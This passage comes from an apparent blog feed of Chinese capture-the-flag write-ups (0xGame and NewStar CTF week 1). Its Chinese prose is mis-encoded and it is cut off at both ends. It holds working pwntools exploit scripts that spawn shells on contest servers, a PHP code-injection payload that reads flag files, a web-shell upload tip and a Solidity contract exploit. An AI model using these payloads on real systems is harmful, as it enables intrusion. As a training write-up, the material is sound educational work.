å†base32è§£ç ï¼Œå¾—åˆ°flagã€‚</p><h2 id="shark-shark"><a href="#shark-shark" class="headerlink" title="shark shark"></a>shark shark</h2><p>wiresharkæ‰“å¼€ï¼Œå‘ç°æœ‰ä¸€å †TCPçš„æ•°æ®ã€‚</p><p>ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸²16è¿›åˆ¶çš„æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</p><p><img src="/0xGame-week1/m_2_1.png"></p><p>æå–å‡ºæ¥åï¼Œå‘ç°å‹ç¼©åŒ…æ˜¯åŠ å¯†çš„ã€‚</p><p>æœ€åè¿½è¸ªrcpæµï¼Œå¾—åˆ°å¯†ç ã€‚</p><p><img src="/0xGame-week1/m_2_2.png"></p><p>è§£å‹æ–‡ä»¶åå³å¯å¾—åˆ°flagã€‚</p><h2 id="least-and-most"><a href="#least-and-most" class="headerlink" title="least and most"></a>least and most</h2><p>ç”¨<code>Stegsolve</code>æ‰“å¼€æ–‡ä»¶ï¼ŒæŸ¥çœ‹æœ€ä½ä½èƒ½çœ‹åˆ°flagçš„å‰åŠã€‚</p><p><img src="/0xGame-week1/m_3_1.png"></p><p>æŸ¥çœ‹æœ€é«˜ä½èƒ½çœ‹åˆ°flagçš„ååŠã€‚</p><p><img src="/0xGame-week1/m_3_2.png"></p><h2 id="é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs"><a href="#é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs" class="headerlink" title="é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs"></a>é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs</h2><p>hint:</p><p><img src="/0xGame-week1/m_4_1.png"></p><p>ä¸‹è½½ä¸€ä¸ª<code>BSPViewer</code>ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://www.jb51.net/softs/644965.html">https://www.jb51.net/softs/644965.html</a></p><p>ç”¨<code>BSPViewer</code>æ‰“å¼€æ–‡ä»¶ï¼Œæ‰¾åˆ°é‚£ä¸ªé¼ï¼Œåœ¨é¼çš„æœ€ä¸‹è§’æ‰¾åˆ°flagã€‚</p><p><img src="/0xGame-week1/m_4_2.png"></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>ç”±é¢˜ç›®æè¿°å’Œæç¤ºå¯ä»¥çŸ¥é“è¿™ä¸ªjpgæ–‡ä»¶ç”¨äº†<code>steghide</code>æ¥éšå†™ï¼Œä½†ä¸çŸ¥é“å¯†é’¥ã€‚ä½¿ç”¨<code>stegseek</code>æ­é…ä¸Škaliçš„<code>rockyou</code>å­—å…¸æ¥çˆ†ç ´å¯†é’¥ã€‚</p><p><img src="/0xGame-week1/m_6_1.png"></p><p>çˆ†ç ´å‡ºå¯†é’¥åå³å¯å¾—åˆ°flagã€‚</p><p><img src="/0xGame-week1/m_6_2.png"></p><h2 id="another-signin"><a href="#another-signin" class="headerlink" title="another signin"></a>another signin</h2><p>åŒºå—é“¾ç­¾åˆ°é¢˜ã€‚</p><p>å‚è€ƒè§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/">ã€CTFã€‘åŒºå—é“¾â€“åˆçº¦é¢˜å…¥é—¨æ“ä½œ åŒºå—é“¾é¢˜å‹ç®€ä»‹ æ°´é¾™å¤´çš„å¯¹æ¯” remixIDEçš„åŸºæœ¬ä½¿ç”¨ 1â€”â€”NewStarCTF</a></p><p>åŸºæœ¬è·Ÿç€è§†é¢‘åšå°±è¡Œäº†ã€‚</p><p>å…ˆå®‰è£…å¥½å°ç‹ç‹¸<code>metamask</code>ã€‚</p><p>åœ¨å°ç‹ç‹¸ä¸­æ·»åŠ <code>rpc</code>ï¼Œä¹Ÿå°±æ˜¯åˆçº¦ç½‘ç»œï¼Œç½‘ç»œå†…å®¹å¦‚ä¸‹ã€‚</p><p><img src="/0xGame-week1/m_5_1.png"></p><p>nc è¿æ¥ï¼Œå…ˆ 1 åˆ›å»ºä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åç”¨å°ç‹ç‹¸è½¬è´¦<code>0.001</code>ï¼Œæ¥ç€ 2 æŸ¥çœ‹åˆ›å»ºæ˜¯å¦æˆåŠŸï¼ŒæˆåŠŸåä¼šè¿”å›ç±»ä¼¼ä¸‹é¢çš„ä¿¡æ¯ã€‚</p><p><img src="/0xGame-week1/m_5_2.png"></p><p>æŸ¥çœ‹ 4 ï¼Œè·å–æºç ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Greeter</span> &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _greeting</span>) &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setGreeting</span>(<span class="params">string memory _greeting</span>) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        string memory expected = <span class="string">&quot;Love0xGame&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(expected)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <a href="https://remix.ethereum.org/">åœ¨çº¿ç½‘ç«™</a> ç¼–å†™åˆçº¦ã€‚</p><p>exp:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract exp&#123;</span><br><span class="line">    address transcation= <span class="number">0x4Bc4FC689aEA6D588B2cad1F4213430bf3Cea410</span>;</span><br><span class="line">    <span class="title class_">Greeter</span> target=<span class="title class_">Greeter</span>(transcation);</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)payable&#123;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">        bool ans=<span class="literal">false</span>;</span><br><span class="line">        string memory greeting=<span class="string">&quot;Love0xGame&quot;</span>;</span><br><span class="line">        target.<span class="title function_">setGreeting</span>(greeting);</span><br><span class="line">        ans=target.<span class="title function_">isSolved</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»åå³å¯å¾—åˆ°flagã€‚</p><p><img src="/0xGame-week1/m_5_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
          <category> æ–°ç”Ÿèµ› </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar-CTF-Week1</title>
      <link href="/NewStar-CTF-Week1/"/>
      <url>/NewStar-CTF-Week1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStar-CTF-week1"><a href="#NewStar-CTF-week1" class="headerlink" title="NewStar CTF week1"></a>NewStar CTF week1</h1><p>å…¨éƒ¨akäº†ï¼Œæ’åç¬¬ä¹ã€‚</p><p><img src="/NewStar-CTF-Week1/1111.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><ol><li><p>ç›´æ¥è®¿é—®<code>www.zip</code>ï¼Œå‘ç°ä¸‹è½½äº†æºç ã€‚</p></li><li><p>å‹ç¼©åŒ…å†…æœ‰ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p><img src="/NewStar-CTF-Week1/w_1_1.png"></p></li><li><p>æŸ¥çœ‹è¿™ä¸¤ä¸ªæ–‡ä»¶å³å¯å¾—åˆ°flagã€‚</p></li></ol><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>åªæœ‰å‰ç«¯è¿‡æ»¤ï¼ŒbpæŠ“åŒ…ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å°±è¡Œäº†ã€‚</p><p><img src="/NewStar-CTF-Week1/w_2_1.png"></p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><ol><li><p>æŒ‰ç…§é¢˜ç›®è¦æ±‚ï¼Œgetä¼ å…¥<code>number1</code>å’Œ<code>number2</code>ï¼Œèƒ½å¤Ÿè®¡ç®—ç»“æœã€‚</p><p><img src="/NewStar-CTF-Week1/w_3_1.png"></p></li><li><p>ä¼ å…¥ä¸€ä¸ªéæ•°å­—ï¼Œè¿›å…¥<code>debug</code>ï¼Œåœ¨<code>debug</code>é¡µé¢æ‰¾åˆ°äº†flagã€‚</p><p><img src="/NewStar-CTF-Week1/w_3_2.png"></p></li></ol><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><ol><li><p>æ ¹æ®è¦æ±‚ï¼Œgetä¼ å…¥<code>ctf=x</code>ã€‚</p></li><li><p>æŸ¥çœ‹æºç å‘ç°äº†æç¤ºï¼Œå°† å­—ç¬¦ä¸²base64è§£ç ï¼Œpostä¼ å…¥<code>secret=n3wst4rCTF2023g00000d</code>ã€‚</p><p><img src="/NewStar-CTF-Week1/w_4_1.png"></p></li><li><p><code>Cookie</code>ä¼ å…¥<code>power=ctfer</code>ã€‚</p></li><li><p><code>User-Agent</code>æ”¹ä¸º<code> NewStarCTF2023</code>ã€‚</p></li><li><p>æ·»åŠ <code>referer</code>ä¸º<code>newstarctf.com</code>ã€‚</p></li><li><p>å‚è€ƒ <a href="http://t.csdn.cn/7Y4Cc">è¿™ä¸ªåšå®¢</a> ï¼Œæ·»åŠ <code>X-Real-IP</code>ä¸º<code>127.0.0.1</code>ã€‚</p><p><img src="/NewStar-CTF-Week1/w_4_2.png"></p></li></ol><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><ol><li><p><code>Level 1</code>ã€<code>Level 2</code>ã€<code>Level 3</code>éƒ½æ‹¿æ•°ç»„ç»•ã€‚</p></li><li><p><code>Level 4</code>ï¼Œgetä¼ å…¥<code>&#39;key5=2024a</code>ï¼Œç»•è¿‡<code>is_numeric</code>ã€‚</p></li><li><p><code>Level 5</code>ï¼Œpostä¼ å…¥<code>flag=%00</code>ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/w_5_1.png"></p></li></ol><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><ol><li><p>é€šè¿‡ç™¾åº¦æœæˆ–è€…çˆ†ç ´ï¼Œå¯ä»¥çŸ¥é“<code>password=114514</code>ã€‚</p><p><img src="/NewStar-CTF-Week1/w_6_1.png"></p></li><li><p>phpå˜é‡çš„ç‰¹æ€§ï¼Œä¼ å…¥<code>e[v.a.l=phpinfo();</code>ï¼ŒæˆåŠŸæ‰§è¡Œä»£ç ã€‚</p><p><img src="/NewStar-CTF-Week1/w_6_2.png"></p></li><li><p>åˆ©ç”¨åå¼•å·ï¼ŒæˆåŠŸè¯»å‡ºflagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=echo `tac /f*`;</span><br></pre></td></tr></table></figure><p><img src="/NewStar-CTF-Week1/w_6_3.png"></p></li></ol><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><ol><li><p>çˆ†ç ´å‡º<code>admin</code>çš„å¯†ç ã€‚</p><p><img src="/NewStar-CTF-Week1/w_7_1.png"></p></li><li><p>ç™»å½•æˆåŠŸåï¼Œå‘ç°ä¼šè·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚</p><p><img src="/NewStar-CTF-Week1/w_7_2.png"></p></li><li><p>æ‰‹åŠ¨è·Ÿè¿‡å»ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/w_7_3.png"></p></li></ol><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><ol><li><p>å¼€å¯äº†pieä¿æŠ¤ã€‚</p></li><li><p>idaæŸ¥çœ‹ï¼Œèƒ½çœ‹åˆ°æœ‰åé—¨å‡½æ•°ã€‚</p><p><img src="/NewStar-CTF-Week1/p_1_1.png"></p></li><li><p>æŸ¥çœ‹å˜é‡<code>buf</code>ï¼Œå¯ä»¥çŸ¥é“<code>buf</code>çš„é•¿åº¦ä¸º<code>0x20</code>ã€‚</p><p><img src="/NewStar-CTF-Week1/p_1_2.png"></p></li><li><p>expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./p1eee&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27761</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\x7b&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A nice try to break pie!!!\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A nice try to break pie!!!\n&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\x64&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>ç–‘æƒ‘ï¼šä¸ºå•¥ç›´æ¥è·³åˆ°åé—¨ä¸è¡Œï¼Œè¦å…ˆè·³åˆ°<code>main</code>å†è·³åˆ°åé—¨ã€‚</p></li></ol><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>idaæ‰“å¼€ï¼Œèƒ½ç›´æ¥çœ‹åˆ°åé—¨çš„åœ°å€å’Œå­—ç¬¦é•¿åº¦ã€‚</p><p><img src="/NewStar-CTF-Week1/p_2_1.png"></p><p><img src="/NewStar-CTF-Week1/p_2_2.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;, 26560)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x04011FB</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>å­¦ä¹ é“¾æ¥ï¼š<a href="https://www.bilibili.com/read/cv11147377/?from=search&spm_id_from=333.337.0.0">https://www.bilibili.com/read/cv11147377/?from=search&amp;spm_id_from=333.337.0.0</a></p><p>åŸºæœ¬å’Œä¸Šé¢å“ªä¸ªä¸€æ ·ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#cal =  process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">cal = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29446</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">cal.send(payload)</span><br><span class="line">cal.interactive()</span><br></pre></td></tr></table></figure><h2 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h2><p>æ•´å½¢æº¢å‡ºã€‚</p><p>åˆ†æå‘ç°ï¼Œ<code>money</code>æ˜¯ä¸€ä¸ªæ— ç¬¦å·å‹æ•´æ•°ï¼Œæˆ‘ä»¬åªè¦åœ¨å•†åº—èŠ±å®Œé’±ï¼Œä¹‹åé€‰3æ‰£ä¸ª50å—ï¼Œæˆ‘ä»¬å°±èƒ½è®©<code>money</code>å˜æˆä¸€ä¸ªè¶…å¤§æ•°ï¼Œä¹‹åå°±èƒ½ä¹°<code>shell</code>äº†ã€‚</p><p><img src="/NewStar-CTF-Week1/p_4_1.png"></p><p><img src="/NewStar-CTF-Week1/p_4_2.png"></p><p><img src="/NewStar-CTF-Week1/p_4_3.png"></p><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>ä¼ªéšæœºæ•°ï¼Œåªè¦ç§å­ç¡®å®šå¥½ï¼Œå°±èƒ½<code>getshell</code>ã€‚</p><p>åˆ©ç”¨<code>$0</code>æ¥è·å–shellï¼Œå‚è€ƒé“¾æ¥ï¼š<a href="http://lihuaxi.xjx100.cn/news/1189683.html?action=onClick">http://lihuaxi.xjx100.cn/news/1189683.html?action=onClick</a></p><p>å› æ­¤æˆ‘ä»¬è·å–çš„ç§å­éœ€è¦æ»¡è¶³èƒ½è¿”å›<code>$0</code>ï¼Œå› æ­¤å†™äº†ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­å¯¹äº†æ‰è¿›è¿œç«¯ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">aa=<span class="string">&quot;2$031&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    elf.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    payload = <span class="built_in">str</span>(elf.rand()).encode()</span><br><span class="line">    a=elf.rand()%<span class="number">5</span></span><br><span class="line">    b=elf.rand()%<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">2</span> <span class="keyword">and</span> b==<span class="number">1</span>:</span><br><span class="line">        <span class="comment">#cal = process(&#x27;./random&#x27;)</span></span><br><span class="line">        cal = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25768</span>)</span><br><span class="line">        cal.recvuntil(<span class="string">b&#x27;can you guess the number?&#x27;</span>)</span><br><span class="line">        cal.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(aa[b]+aa[a])</span><br><span class="line">        cal.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>idaæ‰“å¼€ï¼Œå°±èƒ½åœ¨mainå‡½æ•°æ‰¾åˆ°ä¸¤æ®µflagã€‚</p><p><img src="/NewStar-CTF-Week1/r_1_1.png"></p><p><img src="/NewStar-CTF-Week1/r_1_2.png"></p><h2 id="å’³"><a href="#å’³" class="headerlink" title="å’³"></a>å’³</h2><p>upxçš„å£³ã€‚</p><ol><li><p>å…ˆç”¨<code>exeinfope</code>æŸ¥å£³ï¼Œå¯ä»¥çŸ¥é“æ˜¯<code>upx</code>çš„å£³ã€‚</p><p><img src="/NewStar-CTF-Week1/r_2_1.png"></p></li><li><p>è„±å£³åç”¨idaæ‰“å¼€ï¼Œå¯ä»¥çŸ¥é“<code>flag</code>çš„æ¯ä¸€ä¸ªå­—ç¬¦çš„<code>ascll</code>ç éƒ½+1äº†ä¹‹åå†å’Œ<code>enc</code>åšæ¯”è¾ƒï¼Œè¿˜å¾—çŸ¥äº†<code>enc</code>çš„å€¼ã€‚</p><p><img src="/NewStar-CTF-Week1/r_2_2.png"></p><p><img src="/NewStar-CTF-Week1/r_2_3.png"></p></li><li><p>æœ€åçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><ol><li><p>idaæ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª<code>encode</code>å‡½æ•°ï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ã€‚</p><p><img src="/NewStar-CTF-Week1/r_3_1.png"></p></li><li><p>åè¾¹æŠŠåŠ å¯†çš„å­—ç¬¦å…ˆbase64ç¼–ç åï¼Œå†å’Œ<code>VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t</code>åšæ¯”è¾ƒã€‚</p></li><li><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">b&#x27;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&#x27;</span></span><br><span class="line">b=base64.b64decode(a)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag+=<span class="built_in">chr</span>((i-<span class="number">16</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h2><p>shift_f7ï¼Œå³å¯çœ‹åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/r_4_1.png"></p><h2 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h2><p>idaæ‰“å¼€ï¼Œå‘ç°<code>array</code>æ•°ç»„çš„å€¼å’Œ<code>0x12345678</code>åšå¼‚æˆ–ã€‚</p><p><img src="/NewStar-CTF-Week1/r_5_1.png"></p><p><img src="/NewStar-CTF-Week1/r_5_2.png"></p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a=[<span class="number">0x75553A1E</span>, <span class="number">0x7B583A03</span>, <span class="number">0x4D58220C</span>, <span class="number">0x7B50383D</span>, <span class="number">0x736B3819</span>]</span><br><span class="line">flag=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    hex_string=<span class="built_in">str</span>(<span class="built_in">hex</span>(i^<span class="number">0x12345678</span>))[<span class="number">2</span>:].encode()</span><br><span class="line">    <span class="comment">#print(hex_string)</span></span><br><span class="line">    flag+=binascii.unhexlify(hex_string)[::-<span class="number">1</span>] </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;llittl_Endian_a&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€ååŠ ä¸Šä¸€ä¸ªå¤§æ‹¬å·å°±è¡Œäº†ã€‚</p><h2 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h2><ol><li><p>ç”¨<code>jadx</code>é€†å‘<code>apk</code>ï¼Œä¹‹ååœ¨<code>MainActivity</code>æ‰¾åˆ°äº†è¿™ä¸ªã€‚</p><p><img src="/NewStar-CTF-Week1/r_6_1.png"></p></li><li><p>æ¥ç€åœ¨ä¸‹è¾¹æ‰¾åˆ°äº†ä¸€ä¸ªå¼‚æˆ–çš„å¯†é’¥ã€‚</p></li><li><p>è„šæœ¬ï¼ˆC++ï¼‰ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a[]=&#123;<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;;</span><br><span class="line">string key=<span class="string">&quot;happyx3&quot;</span>;</span><br><span class="line">string flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag+=(<span class="type">char</span>)(a[i]^key[i%key.<span class="built_in">length</span>()]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;3z_And0r1d_X0r_x1x1&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h2><p>åŒæ ·ç”¨<code>jadx</code>é€†å‘ï¼Œå…¨å±€æœ<code>flag&#123;</code>å³å¯çœ‹åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/r_7_1.png"></p><h2 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h2><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/cyx-b/p/13485664.html">https://www.cnblogs.com/cyx-b/p/13485664.html</a></p><p>å…ˆå­¦ä¹ PEç¨‹åºçš„ç»“æ„ï¼Œç„¶åä¿®å¤PEå¤´ã€‚</p><p><img src="/NewStar-CTF-Week1/r_8_1.png"></p><p>ä¹‹åç”¨idaæ‰“å¼€ï¼Œå¯ä»¥å‘ç°è¾“å…¥å‡ºäº†æœ€åä¸€ä½ï¼Œæ¯ä¸€ä½éƒ½å’Œåä¸€ä½è¿›è¡Œå¼‚æˆ–ã€‚</p><p><img src="/NewStar-CTF-Week1/r_8_2.png"></p><p><img src="/NewStar-CTF-Week1/r_8_3.png"></p><p>è„šæœ¬ï¼ˆc++ï¼‰ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span 